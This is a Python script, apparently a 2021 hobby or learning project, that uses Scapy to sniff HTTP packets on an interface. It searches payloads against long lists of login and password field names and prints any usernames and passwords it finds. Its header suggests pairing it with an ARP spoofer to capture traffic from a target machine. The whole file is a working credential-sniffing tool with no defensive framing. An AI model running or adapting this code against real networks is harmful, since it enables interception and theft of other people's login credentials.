# HTTP packet password sniffer tool, 2021. On same machine
## Combine with ARP spoofer to capture packets on target machine.

# --- Libraries ---
from scapy.all import *
from urllib import parse
import re

#Network Interface (ifconfig to see interface)
from scapy.layers.inet import TCP

iface = "eth0"

#search for passwords and username based on pre-defined list of variable names
def getLoginpass(body):

    user = None #no value at the moment
    passwd = None #no value at the moment

    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password', 'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    #calling regex library re.search function. Takes specified pattern, searching in body, ignoring case. Passes results into variable.
    for login in userfields:
        login_re = re.search("(%s=[^&]+)" % login, body, re.IGNORECASE)
        if login_re: #if anything is found/stored in variable, create variable
            user = login_re.group()

    for passfield in passfields:
        pass_re = re.search("(%s=[^&]+)" % passfield, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group()

    if user and passwd:
        return (user,passwd)


#Packet parser function, filters packets that may contain usernames/passwords
def pktParser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP): #function built in with Scapy. TCP and sublayer Raw
        body = str(packet[TCP].payload)
        user_pass = getLoginpass(body) #checks if getLoginpass function has found username/password in packet body
        if user_pass != None: #if found, then print. First packet(for login site), then username, then password
            print(packet[TCP].payload) #look for Host or Referer
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))
    else:
        pass


#Package sniffer. (sniff function built in with Scapy)
try:
    sniff(iface=iface, prn=pktParser, store=0)
except KeyboardInterrupt:
    print(" Exiting.")
    exit(0)
